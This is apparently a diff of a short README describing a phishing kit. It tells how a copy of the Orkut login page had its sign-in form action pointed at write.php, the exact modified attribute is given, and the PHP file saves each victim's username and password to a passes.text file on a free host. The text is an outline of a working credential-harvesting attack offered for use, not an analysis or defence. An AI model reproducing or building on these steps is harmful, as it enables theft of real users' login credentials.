@@ -11,7 +11,9 @@ This has 2 files. Which I hosted on a free server.
 2. Write.php
 
 
-index.htm was made by first copying the source code of the Orkut login page. Then modifying it by adding this in line 128 to signin button action.  action=write.php id="https://www.google.com/accounts/ServiceLoginAuth?service=orkut" 
+index.htm was made by first copying the source code of the Orkut login page. Then modifying it by adding this in the line 128 to signin button action. 
+ action=write.php id="https://www.google.com/accounts/ServiceLoginAuth?service=orkut" 
+
 
 Write.php creates a passes.text file. And then writes the username and password to it.
 
